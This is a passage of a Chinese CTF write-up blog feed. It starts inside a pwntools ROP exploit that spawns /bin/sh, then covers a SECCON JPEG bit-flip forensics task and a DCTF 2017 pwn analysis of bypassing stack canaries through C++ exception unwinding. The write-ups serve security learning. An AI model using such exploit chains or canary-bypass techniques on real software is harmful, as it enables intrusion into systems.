class="string">&quot;E&quot;</span> * (<span class="number">0x80</span> + <span class="number">0x40</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)        <span class="comment"># read</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">59</span>)  <span class="comment"># __NR_execve</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;break *0x40129F</span></span><br><span class="line"><span class="string">break *0x401465&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JPEG-file"><a href="#JPEG-file" class="headerlink" title="JPEG file"></a>JPEG file</h2><p>JPEG file<br>Read this JPEG is broken.<br>It will be fixed if you change somewhere by 1 bit.</p><p><a href="https://www.imagemagick.org/script/identify.php">https://www.imagemagick.org/script/identify.php</a><br>用这的工具去检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">magick identify -verbose tktk.jpg</span><br><span class="line">Image: tktk.jpg</span><br><span class="line">  Format: JPEG (Joint Photographic Experts Group JFIF format)</span><br><span class="line">  Mime <span class="built_in">type</span>: image/jpeg</span><br><span class="line">  Class: DirectClass</span><br><span class="line">  Geometry: 339x53+0+0</span><br><span class="line">  Resolution: 192x192</span><br><span class="line">  Print size: 1.76562x0.276042</span><br><span class="line">  Units: PixelsPerInch</span><br><span class="line">  Type: Grayscale</span><br><span class="line">  Base <span class="built_in">type</span>: TrueColor</span><br><span class="line">  Endianess: Undefined</span><br><span class="line">  Colorspace: sRGB</span><br><span class="line">  Depth: 8-bit</span><br><span class="line">  Channel depth:</span><br><span class="line">    Gray: 8-bit</span><br><span class="line">  Channel statistics:</span><br><span class="line">    Pixels: 17967</span><br><span class="line">    Gray:</span><br><span class="line">      min: 99  (0.388235)</span><br><span class="line">      max: 153 (0.6)</span><br><span class="line">      mean: 128.001 (0.501966)</span><br><span class="line">      standard deviation: 0.796015 (0.00312163)</span><br><span class="line">      kurtosis: 879.955</span><br><span class="line">      skewness: 0.249206</span><br><span class="line">      entropy: 0.0271321</span><br><span class="line">  Colors: 14</span><br><span class="line">  Histogram:</span><br><span class="line">         4: ( 99, 99, 99) <span class="comment">#636363 grey39</span></span><br><span class="line">         4: (113,113,113) <span class="comment">#717171 srgb(113,113,113)</span></span><br><span class="line">         4: (115,115,115) <span class="comment">#737373 grey45</span></span><br><span class="line">         4: (117,117,117) <span class="comment">#757575 grey46</span></span><br><span class="line">         4: (121,121,121) <span class="comment">#797979 srgb(121,121,121)</span></span><br><span class="line">        16: (126,126,126) <span class="comment">#7E7E7E gray</span></span><br><span class="line">        28: (127,127,127) <span class="comment">#7F7F7F grey50</span></span><br><span class="line">     17799: (128,128,128) <span class="comment">#808080 fractal</span></span><br><span class="line">        68: (129,129,129) <span class="comment">#818181 srgb(129,129,129)</span></span><br><span class="line">         4: (130,130,130) <span class="comment">#828282 grey51</span></span><br><span class="line">         8: (131,131,131) <span class="comment">#838383 srgb(131,131,131)</span></span><br><span class="line">        12: (132,132,132) <span class="comment">#848484 srgb(132,132,132)</span></span><br><span class="line">         4: (137,137,137) <span class="comment">#898989 srgb(137,137,137)</span></span><br><span class="line">         8: (153,153,153) <span class="comment">#999999 grey60</span></span><br><span class="line">  Rendering intent: Perceptual</span><br><span class="line">  Gamma: 0.454545</span><br><span class="line">  Chromaticity:</span><br><span class="line">    red primary: (0.64,0.33)</span><br><span class="line">    green primary: (0.3,0.6)</span><br><span class="line">    blue primary: (0.15,0.06)</span><br><span class="line">    white point: (0.3127,0.329)</span><br><span class="line">  Matte color: grey74</span><br><span class="line">  Background color: white</span><br><span class="line">  Border color: srgb(223,223,223)</span><br><span class="line">  Transparent color: none</span><br><span class="line">  Interlace: None</span><br><span class="line">  Intensity: Undefined</span><br><span class="line">  Compose: Over</span><br><span class="line">  Page geometry: 339x53+0+0</span><br><span class="line">  Dispose: Undefined</span><br><span class="line">  Iterations: 0</span><br><span class="line">  Compression: JPEG</span><br><span class="line">  Quality: 95</span><br><span class="line">  Orientation: Undefined</span><br><span class="line">  Properties:</span><br><span class="line">    date:create: 2017-12-12T15:19:55+08:00</span><br><span class="line">    date:modify: 2017-12-09T22:18:51+08:00</span><br><span class="line">    jpeg:colorspace: 2</span><br><span class="line">    jpeg:sampling-factor: 2x2,1x1,1x1</span><br><span class="line">    signature: be9fd7cce707a16b630c1db97798b1f402a0dd2da77fb636cc8e2647abcc768e</span><br><span class="line">  Artifacts:</span><br><span class="line">    verbose: <span class="literal">true</span></span><br><span class="line">  Tainted: False</span><br><span class="line">  Filesize: 11628B</span><br><span class="line">  Number pixels: 17967</span><br><span class="line">  Pixels per second: 898351B</span><br><span class="line">  User time: 0.010u</span><br><span class="line">  Elapsed time: 0:01.019</span><br><span class="line">  Version: ImageMagick 7.0.7-14 Q16 x86_64 2017-12-07 http://www.imagemagick.org</span><br><span class="line">identify: Corrupt JPEG data: premature end of data segment `tktk.jpg<span class="string">&#x27; @ warning/jpeg.c/JPEGWarningHandler/365.</span></span><br><span class="line"><span class="string">identify: Unsupported marker type 0xfc `tktk.jpg&#x27;</span> @ warning/jpeg.c/JPEGErrorHandler/329.</span><br></pre></td></tr></table></figure><p>可以看到错误的字节是 0xfc<br>由于标记以0xFF开头，因此我们只需要在二进制文件中找到FF FC，并在0xFF中改变一些位以删除该无效标记</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/SECCON/re/jpg-file [15:23:57]</span></span><br><span class="line">$ binwalk -R <span class="string">&quot;\xFF\xFC&quot;</span> tktk.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">623           0x26F           \xFF\xFC</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>确定偏移后 就是暴力出奇迹的时候了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;./tktk&quot;</span>)</span><br><span class="line">origin = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">byte =  <span class="number">623</span></span><br><span class="line">bit = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="comment">#if(raw_input() == &quot;b&quot;):</span></span><br><span class="line">    <span class="comment">#    break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Byte, bit: %d, %d&quot;</span> % (byte, bit)</span><br><span class="line">    content = origin[:byte] + chr(ord(origin[byte]) ^ (<span class="number">1</span> &lt;&lt; bit)) + origin[byte+<span class="number">1</span>:]</span><br><span class="line">    outfile = open(<span class="string">&quot;./tktkout.jpg&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    outfile.write(content)</span><br><span class="line">    outfile.close()</span><br><span class="line">    bit += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(bit == <span class="number">8</span>):</span><br><span class="line">        bit = <span class="number">0</span></span><br><span class="line">        byte += <span class="number">1</span></span><br><span class="line">    os.system(<span class="string">&quot;/Users/xxx/.iterm2/imgcat ./tktkout.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>[[‘T’, ‘h’, ‘e’, ‘q’, ‘u’, ‘i’, ‘c’], [‘k’, ‘b’, ‘r’, ‘o’, ‘w’, ‘n’, ‘f’], [‘o’, ‘x’, ‘j’, ‘u’, ‘m’, ‘p’, ‘s’], [‘o’, ‘v’, ‘e’, ‘r’, ‘t’, ‘h’, ‘e’], [‘l’, ‘a’, ‘z’,’y’, ‘d’, ‘o’, ‘g’]]</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SECCON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shanghai-DCTF-2017 线下攻防Pwn题</title>
      <link href="2017-Shanghai-DCTF-final-pwn.html"/>
      <url>2017-Shanghai-DCTF-final-pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Shanghai-DCTF-2017 线下攻防Pwn题  –利用c++异常机制绕过canary检查，文章首发于360安全客【<a href="https://www.anquanke.com/post/id/89855%E3%80%91">https://www.anquanke.com/post/id/89855】</a></p><p>题目和完整的exp可以从这里获取<a href="https://pan.baidu.com/s/1nuNQC9z">链接</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="现场入坑"><a href="#现场入坑" class="headerlink" title="现场入坑"></a>现场入坑</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-01.jpg"></a></p><p>菜单栏中一共有五个选项，其中最容易引起我们注意的就是选项4，<strong>test security</strong>，在这个函数里有三个漏洞</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-02.jpg"></a></p><p>分别是格式化字符串漏洞 、栈溢出、堆溢出，<br>1.格式化字符串漏洞</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-03.jpg"></a></p><p>格式化串不可控<br>2.栈溢出</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-04.jpg"></a></p><p>结构化写入，但是题目开启了canary 没法绕过</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-05.jpg"></a></p><p>3.堆溢出<br>仅仅一次溢出无返回，我没想到方法</p><p>但是由于上述原因三个没法完整利用起来，如果阅读到这篇文章到你，有利用方法或者利用思路请邮件告知我。</p><p>在决赛现场把时间都在耗在了这个函数里了，现在想想估计进了一个大坑吧。</p><h3 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h3><p>比赛结束后，还是感觉心里堵堵的，心想，比赛也不单单是比赛吧，遇到了问题总不去解决总还有会遇到的，比赛结束后的几天，我拿到了题目的exp，于是开始了调试之旅。</p><p>题目的关键在第一个函数里，<strong>start flexmdt</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-06.jpg"></a></p><p>我们仔细看这个函数的流程，首先程序里进行了一个异常捕捉机制，在伪代码中，这个try结构并没有显示出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    sub_401148();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">int</span> *_ZTIi)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在**sub_401148()**这个函数里面<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-07.jpg"></a></p><p>其实是能注意到一个整型溢出的漏洞<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg"></a></p><p>对输入加一后进行无符号整型强制转换</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg"></a><br>这样一来，我们发现这里就存在了一个栈溢出漏洞…读取的s1是在栈上的</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-09.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-09.jpg"></a></p><p>但是又回到了一开始的问题，如何绕过canary?</p><h2 id="C-异常机制"><a href="#C-异常机制" class="headerlink" title="C++异常机制"></a>C++异常机制</h2><p>于是，我们开始去研究**sub_400F8F()**函数周围存在的异常机制</p><h3 id="C-函数的调用和返回"><a href="#C-函数的调用和返回" class="headerlink" title="C++ 函数的调用和返回"></a>C++ 函数的调用和返回</h3><p>首先异常机制中最重要的三个关键字就是：throw   try   catch，Throw抛出异常，try 包含异常模块，catch 捕捉抛出的异常，三者各有各的分工，集成在一起就构成了异常的基本机制</p><p>首先澄清一点，这里说的 “C++ 函数”是指：<br>1.该函数可能会直接或间接地抛出一个异常：即该函数的定义存放在一个 C++ 编译（而不是传统 C）单元内，并且该函数没有使用“throw()”异常过滤器。<br>2.该函数的定义内使用了 try 块。<br>只需要满足一点即可，</p><h3 id="异常抛出"><a href="#异常抛出" class="headerlink" title="异常抛出"></a>异常抛出</h3><p>在编译一段 C++ 代码时，编译器会将所有 throw 语句替换为其 C++ 运行时库中的某一指定函数，这里我们叫它 __CxxRTThrowExp（与本文提到的所有其它数据结构和属性名一样，在实际应用中它可以是任意名称）。该函数接收一个编译器认可的内部结构（我们叫它 EXCEPTION 结构）。这个结构中包含了待抛出异常对象的起始地址、用于销毁它的析构函数，以及它的 type_info 信息。对于没有启用 RTTI 机制（编译器禁用了 RTTI 机制或没有在类层次结构中使用虚表）的异常类层次结构，可能还要包含其所有基类的 type_info 信息，以便与相应的 catch 块进行匹配。</p><p>__CxxRTThrowExp 首先接收（并保存）EXCEPTION 对象；然后从 TLS：Current ExpHdl 处找到与当前函数对应的 piHandler、nStep 等异常处理相关数据；并按照前文所述的机制完成异常捕获和栈回退。由此完成了包括“抛出”-&gt;“捕获”-&gt;“回退”等步骤的整套异常处理机制。</p><h3 id="异常捕获机制"><a href="#异常捕获机制" class="headerlink" title="异常捕获机制"></a>异常捕获机制</h3><p>一个异常被抛出时，就会立即引发 C++ 的异常捕获机制：<br>根据 c++ 的标准，异常抛出后如果在当前函数内没有被捕捉(catch)，它就要沿着函数的调用链继续往上抛，直到走完整个调用链，或者在某个函数中找到相应的 catch。如果走完调用链都没有找到相应的 catch，那么std::terminate() 就会被调用，这个函数默认是把程序 abort，而如果最后找到了相应的 catch，就会进入该 catch 代码块，执行相应的操作。</p><p>程序中的 catch 那部分代码有一个专门的名字叫作：Landing pad（不十分准确），从抛异常开始到执行 landing pad 里的代码这中间的整个过程叫作 stack unwind，这个过程包含了两个阶段：<br>1）从抛异常的函数开始，对调用链上的函数逐个往前查找 landing pad。</p><p>2）如果没有找到 landing pad 则把程序 abort，否则，则记下 landing pad 的位置，再重新回到抛异常的函数那里开始，一帧一帧地清理调用链上各个函数内部的局部变量，直到 landing pad 所在的函数为止。</p><p>为了能够成功地捕获异常和正确地完成栈回退（stack unwind）</p><h3 id="栈回退（Stack-Unwind）机制"><a href="#栈回退（Stack-Unwind）机制" class="headerlink" title="栈回退（Stack Unwind）机制"></a>栈回退（Stack Unwind）机制</h3><p>“回退”是伴随异常处理机制引入 C++ 中的一个新概念，主要用来确保在异常被抛出、捕获并处理后，所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收。</p><h3 id="总结下过程"><a href="#总结下过程" class="headerlink" title="总结下过程"></a>总结下过程</h3><p>在调试的程序的过程中，我们也发现，异常对象由函数 <strong>cxa_allocate_exception() 进行创建，最后由 __cxa_free_exception() 进行销毁。当我们在程序里执行了抛出异常后，编译器为我们做了如下的事情：<br>1）调用 __cxa_allocate_exception 函数，分配一个异常对象。</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-10.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-10.jpg"></a></p><p>2）调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化__</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-11.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-11.jpg"></a></p><p>3）__cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。</p><p>4）_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</p><p>5）如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</p><p>6）_Unwind_RaiseException() 将控制权转到相应的catch代码。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-12.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-12.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-13.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-13.jpg"></a></p><ol start="7"><li>unwind 完成，用户代码继续执行。</li></ol><p>然后我们很惊讶的发现，程序跳过了canary检查的环节</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-14.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-14.jpg"></a></p><p>这很让我好奇…unwind的时候是不是发生了什么？</p><h3 id="unwind的做了什么？"><a href="#unwind的做了什么？" class="headerlink" title="unwind的做了什么？"></a>unwind的做了什么？</h3><p>unwind 的过程是从 __cxa_throw() 里开始的，请看如下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="keyword">void</span></span><br><span class="line">__cxxabiv1::__cxa_throw (<span class="keyword">void</span> *obj, <span class="built_in">std</span>::type_info *tinfo,</span><br><span class="line"><span class="keyword">void</span> (_GLIBCXX_CDTOR_CALLABI *dest) (<span class="keyword">void</span> *))</span><br><span class="line">&#123;</span><br><span class="line">   PROBE2 (<span class="keyword">throw</span>, obj, tinfo);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Definitely a primary.</span></span><br><span class="line">   __cxa_refcounted_exception *header = __get_refcounted_exception_header_from_obj (obj);</span><br><span class="line">   header-&gt;referenceCount = <span class="number">1</span>;</span><br><span class="line">   header-&gt;exc.exceptionType = tinfo;</span><br><span class="line">   header-&gt;exc.exceptionDestructor = dest;</span><br><span class="line">   header-&gt;exc.unexpectedHandler = <span class="built_in">std</span>::get_unexpected ();</span><br><span class="line">   header-&gt;exc.terminateHandler = <span class="built_in">std</span>::get_terminate ();</span><br><span class="line">   __GXX_INIT_PRIMARY_EXCEPTION_CLASS(header-&gt;exc.unwindHeader.exception_class);</span><br><span class="line">   header-&gt;exc.unwindHeader.exception_cleanup = __gxx_exception_cleanup;</span><br><span class="line"></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">ifdef</span> _GLIBCXX_SJLJ_EXCEPTIONS</span></span><br><span class="line">   _Unwind_SjLj_RaiseException (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">   _Unwind_RaiseException (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Some sort of unwinding error. Note that terminate is a handler.</span></span><br><span class="line">   __cxa_begin_catch (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">terminate</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到 __cxa_throw 最终调用了 _Unwind_RaiseException()，stack unwind 就此开始，如前面所说，unwind 分为两个阶段，分别进行搜索 catch 及清理调用栈，其相应的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Raise an exception, passing along the given exception object.  */</span></span><br><span class="line"></span><br><span class="line">_Unwind_Reason_Code</span><br><span class="line">_Unwind_RaiseException(struct _Unwind_Exception *exc)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Context</span> <span class="title">this_context</span>, <span class="title">cur_context</span>;</span></span><br><span class="line">  _Unwind_Reason_Code code;</span><br><span class="line"></span><br><span class="line">  uw_init_context (&amp;this_context);</span><br><span class="line">  cur_context = this_context;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phase 1: Search.  Unwind the stack, calling the personality routine</span></span><br><span class="line"><span class="comment">     with the _UA_SEARCH_PHASE flag set.  Do not modify the stack yet.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _Unwind_FrameState fs;</span><br><span class="line"></span><br><span class="line">      code = uw_frame_state_for (&amp;cur_context, &amp;fs);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code == _URC_END_OF_STACK)</span><br><span class="line">    <span class="comment">/* Hit end of stack with no handler found.  */</span></span><br><span class="line">    <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">    <span class="comment">/* Some error encountered.  Ususally the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">       diagnose these and merely crashes.  */</span></span><br><span class="line">    <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fs.personality)</span><br><span class="line">    &#123;</span><br><span class="line">      code = (*fs.personality) (<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">                    exc, &amp;cur_context);</span><br><span class="line">      <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">        <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      uw_update_context (&amp;cur_context, &amp;fs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Indicate to _Unwind_Resume and associated subroutines that this</span></span><br><span class="line"><span class="comment">     is not a forced 